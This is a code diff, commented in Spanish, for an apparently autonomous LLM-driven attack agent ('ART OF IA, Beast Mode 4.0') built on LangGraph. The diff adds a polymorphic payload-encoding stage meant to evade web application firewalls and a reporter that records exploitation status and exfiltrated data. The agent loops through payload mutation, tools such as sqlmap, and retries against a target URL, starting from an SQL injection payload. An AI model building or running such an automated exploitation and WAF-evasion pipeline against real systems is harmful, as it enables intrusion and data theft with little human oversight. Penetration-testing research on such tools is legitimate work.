@@ -1,11 +1,14 @@
 import os
 import asyncio
+import json
+from datetime import datetime
 from typing import TypedDict, List, Dict, Any, Union
 from langgraph.graph import StateGraph, END
 
-# Importaciones de los módulos evolucionados en Fase 2
+# Core Framework
 from dual_llm_pattern import PrivilegedLLM, QuarantineLLM, SymbolicController
 from reflector import Reflector
+from polymorphic_bridge import poly_bridge  # Integración del Puente Polimórfico
 
 # Módulos de soporte
 try:
@@ -15,7 +18,29 @@ try:
 except ImportError as e:
     print(f"[!] Warning: Módulos auxiliares no encontrados ({e}). Usando fallbacks.")
 
-# --- ESQUEMA DE ESTADO "BEAST MODE 2.0" ---
+# --- UTILIDAD DE REPORTING (Fase 4) ---
+class ArtOfIA_Reporter:
+    """Genera la evidencia técnica de la vulnerabilidad encontrada."""
+    @staticmethod
+    def generate_poc_report(state: 'AgentState'):
+        report = {
+            "timestamp": datetime.now().isoformat(),
+            "target": state.get("target_url"),
+            "vulnerability": state.get("vuln_type"),
+            "final_payload": state.get("current_payload"),
+            "polymorphic_chain": state.get("polymorphic_chain"),
+            "attack_history": state.get("failed_attempts_summary", []),
+            "status": "EXPLOITED" if state.get("status") == "success" else "PARTIAL_SUCCESS",
+            "evidence": state.get("exfiltrated_data", "N/A")
+        }
+        
+        filename = f"poc_{state.get('vuln_type', 'vuln')}_{int(datetime.now().timestamp())}.json"
+        with open(filename, "w") as f:
+            json.dump(report, f, indent=4)
+        
+        return filename
+
+# --- ESQUEMA DE ESTADO "BEAST MODE 4.0" ---
 class AgentState(TypedDict):
     # Misión y Target
     mission: str
@@ -24,21 +49,22 @@ class AgentState(TypedDict):
     # Payload y Vulnerabilidad
     current_payload: str
     vuln_type: str  # 'SQLI', 'LFI', 'XSS'
+    polymorphic_chain: List[str] 
     
     # Control de Flujo
     iteration: int
     status: str # 'starting', 'success', 'blocked', 'failed', 'analyzed'
-    last_action: str # 'MUTATE' o 'RUN_TOOL'
+    last_action: str # 'MUTATE', 'RUN_TOOL', 'POLYMORPH'
     
     # Datos de Análisis y Exfiltración
     exfiltrated_data: str
-    tool_output: str # Almacena el stdout de sqlmap, nmap, etc.
-    last_tool: str # Nombre de la herramienta ejecutada
+    tool_output: str 
+    last_tool: str 
     last_response_metadata: Dict[str, Any] 
     waf_metadata: Dict[str, Any] 
     failed_attempts_summary: List[Dict[str, Any]] 
     
-    # Mapa Simbólico
+    # Mapa Simbólico (Aislamiento Zero-Trust)
     symbolic_map: List[str]
 
 class ArtOfIAOrchestrator:
@@ -79,9 +105,9 @@ class ArtOfIAOrchestrator:
 
     async def quarantine_node(self, state: AgentState):
         """L1: Aislamiento y Simbolización de la respuesta hostil."""
-        print("[*] [QUARANTINE] Ejecutando aislamiento simbólico (L1)...")
+        print("[*] [QUARANTINE] Ejecutando aislamiento y sanitización L1...")
         
-        # Obtenemos el contenido real para analizar (de la última respuesta del reflector)
+        # El Reflector guarda el contenido en last_response_metadata
         raw_response = state.get("last_response_metadata", {}).get("last_content", "")
         if not raw_response:
             raw_response = f"Target URL: {state['target_url']}"
@@ -92,6 +118,7 @@ class ArtOfIAOrchestrator:
             "waf_metadata": {
                 "block_detected": symbolic_findings.get("waf_block_detected", False),
                 "status_code": symbolic_findings.get("status_code"),
+                "block_type": state.get("last_response_metadata", {}).get("block_type", "Generic"),
                 "detected_tech": symbolic_findings.get("technologies", [])
             },
             "symbolic_map": symbolic_findings.get("parameters", []),
@@ -100,24 +127,22 @@ class ArtOfIAOrchestrator:
 
     async def strategy_node(self, state: AgentState):
         """
-        Sustituye al antiguo Sniper Node.
-        El Cerebro (L2) decide si usar una MUTACIÓN quirúrgica o una HERRAMIENTA profesional.
+        Cerebro L2: Decide entre MUTATE (quirúrgico), RUN_TOOL (profesional) o POLYMORPH (evasión).
         """
-        print(f"[*] [STRATEGY] Consultando al PrivilegedLLM sobre el vector {state.get('vuln_type')}...")
+        print(f"[*] [STRATEGY] Analizando vector {state.get('vuln_type')}...")
         
-        # El cerebro analiza el contexto simbólico y decide la acción
-        # Enviamos el contexto simbólico actual
         symbolic_context = {
             "parameters": state.get("symbolic_map", []),
             "waf_block_detected": state.get("waf_metadata", {}).get("block_detected", False),
+            "block_type": state.get("waf_metadata", {}).get("block_type"),
             "status_code": state.get("waf_metadata", {}).get("status_code")
         }
         
         decision = await self.brain.decide_action(symbolic_context)
-        
-        # Si la decisión es MUTATE, aplicamos la mutación inmediatamente
-        if decision.get("action") == "MUTATE":
-            print(f"[+] [STRATEGY] Decisión: MUTATE. Aplicando bypass quirúrgico...")
+        action = decision.get("action")
+
+        if action == "MUTATE":
+            print(f"[+] [STRATEGY] Decisión: MUTATE.")
             strategy_name = await self.brain.decide_strategy(state)
             try:
                 mutated_payload = arsenal.mutate(
@@ -131,26 +156,45 @@ class ArtOfIAOrchestrator:
                     "status": "ready_to_test"
                 }
             except Exception as e:
-                print(f"[-] Error en mutación: {e}")
                 return {"last_action": "MUTATE", "status": "ready_to_test"}
         
-        # Si la decisión es RUN_TOOL, pasamos el control al ToolExecutor
-        elif decision.get("action") == "RUN_TOOL":
+        elif action == "RUN_TOOL":
             print(f"[+] [STRATEGY] Decisión: RUN_TOOL ({decision.get('tool')}).")
             return {
                 "last_action": "RUN_TOOL",
                 "last_tool": decision.get("tool"),
-                "current_payload": decision.get("arguments"), # Guardamos los args como payload temporal
+                "current_payload": decision.get("arguments"), 
                 "status": "ready_for_tool"
+            }
+        
+        elif action == "POLYMORPH":
+            print(f"[+] [STRATEGY] Decisión: POLYMORPH. Diseñando cadena de evasión...")
+            chain = decision.get("chain", ["URL_ENCODE"]) 
+            return {
+                "polymorphic_chain": chain,
+                "last_action": "POLYMORPH",
+                "status": "ready_for_poly"
             }
         
         return {"status": "failed"}
 
-    async def tool_executor_node(self, state: AgentState):
-        """El Brazo Robótico: Ejecuta la herramienta en el contenedor ai-worker."""
-        print(f"[*] [EXECUTOR] Lanzando herramienta {state.get('last_tool')} en sandbox...")
+    async def polymorph_node(self, state: AgentState):
+        """Aplica las transformaciones de codificación al payload actual."""
+        print(f"[*] [POLYMORPH] Aplicando cadena: {state.get('polymorphic_chain')}...")
         
-        # Llamamos al orquestador de ejecución del cerebro
+        payload = state.get("current_payload", "")
+        chain = state.get("polymorphic_chain", [])
+        encoded_payload = poly_bridge.apply_chain(payload, chain)
+        
+        return {
+            "current_payload": encoded_payload,
+            "status": "ready_to_test"
+        }
+
+    async def tool_executor_node(self, state: AgentState):
+        """Ejecución en sandbox (ai-worker)."""
+        print(f"[*] [EXECUTOR] Lanzando {state.get('last_tool')}...")
+        
         decision = {
             "action": "RUN_TOOL", 
             "tool": state.get("last_tool"), 
@@ -160,63 +204,66 @@ class ArtOfIAOrchestrator:
         result = await self.brain.secure_tool_execution(decision)
         
         if result["status"] == "success":
-            return {
-                "tool_output": result.get("output", ""),
-                "status": "tool_completed"
-            }
+            return {"tool_output": result.get("output", ""), "status": "tool_completed"}
         else:
-            print(f"[-] Tool Error: {result.get('message')}")
             return {"status": "failed", "tool_output": result.get("message")}
 
     async def reflector_node(self, state: AgentState):
-        """El Juez Híbrido: Analiza HTTP Response o Tool Output."""
-        # El reflector ahora sabe si analizar un payload o una salida de herramienta
-        # basándose en 'last_action'
-        result = await self.reflector.execute(state)
-        return result
+        """Análisis de respuesta y validación de éxito."""
+        return await self.reflector.execute(state)
+
+    async def report_node(self, state: AgentState):
+        """HARDENING FASE 4: Genera el informe técnico final y la PoC."""
+        print("[*] [REPORTING] Generando informe de explotación y evidencia técnica...")
+        filename = ArtOfIA_Reporter.generate_poc_report(state)
+        print(f"[+] PoC generada exitosamente en: {filename}")
+        return {**state, "status": "reported"}
 
     def build_graph(self):
-        """Construcción del Grafo de Estado de LangGraph (Beast Mode 2.0)."""
+        """Construcción del Grafo LangGraph (Beast Mode 4.0)."""
         workflow = StateGraph(AgentState)
         
         # Añadir nodos
         workflow.add_node("planner", self.planner_node)
         workflow.add_node("quarantine", self.quarantine_node)
         workflow.add_node("strategy", self.strategy_node)
+        workflow.add_node("polymorph", self.polymorph_node)
         workflow.add_node("tool_executor", self.tool_executor_node)
         workflow.add_node("reflector", self.reflector_node)
+        workflow.add_node("report_gen", self.report_node)
 
         # --- FLUJO DE EJECUCIÓN ---
         workflow.set_entry_point("planner")
         workflow.add_edge("planner", "reflector")
         
-        # Ruteo Condicional desde Reflector
+        # Reflector -> Reporte (si éxito) o Quarantine (si falla/bloqueo)
         workflow.add_conditional_edges(
             "reflector",
             lambda x: x["status"],
             {
-                "success": END,
+                "success": "report_gen",
                 "blocked": "quarantine",
                 "failed": "quarantine",
-                "tool_completed": "quarantine" # Analizar el resultado de la herramienta
+                "tool_completed": "quarantine"
             }
         )
         
-        # El camino después de Quarantine siempre es la Estrategia
+        workflow.add_edge("report_gen", END)
         workflow.add_edge("quarantine", "strategy")
         
-        # Ruteo Condicional desde Strategy (Cerebro)
+        # Strategy -> Acciones Diversas
         workflow.add_conditional_edges(
             "strategy",
             lambda x: x["last_action"],
             {
-                "MUTATE": "reflector",      # Si mutamos, probamos el payload directamente
-                "RUN_TOOL": "tool_executor" # Si decidimos herramienta, vamos al ejecutor
+                "MUTATE": "reflector",
+                "RUN_TOOL": "tool_executor",
+                "POLYMORPH": "polymorph"
             }
         )
         
-        # Después de ejecutar la herramienta, vamos al reflector para validar el éxito
         workflow.add_edge("tool_executor", "reflector")
+        workflow.add_edge("polymorph", "reflector")
 
         return workflow.compile()
 
@@ -226,8 +273,8 @@ async def main():
     app = orchestrator.build_graph()
     
     print("\n" + "="*60)
-    print(" ART OF IA v3.0 - BEAST MODE: PHASE 2 ACTIVE ")
-    print(" [Strategic Brain] | [Professional Arsenal] | [Hybrid Reflector] ")
+    print(" ART OF IA v4.0 - BEAST MODE: HARDENING PHASE ")
+    print(" [Strategic Brain] | [Polymorphic Bridge] | [Reporting PoC] ")
     print("="*60 + "\n")
     
     initial_state = {
@@ -235,6 +282,7 @@ async def main():
         "target_url": target,
         "current_payload": "1' OR 1=1--", 
         "vuln_type": "SQLI", 
+        "polymorphic_chain": [],
         "exfiltrated_data": "",
         "iteration": 0,
         "status": "starting",
@@ -248,7 +296,6 @@ async def main():
     
     try:
         async for output in app.astream(initial_state):
-            # El estado se actualiza automáticamente en el grafo
             pass
     except Exception as e:
         print(f"[!] Error en el ciclo de ejecución: {e}")
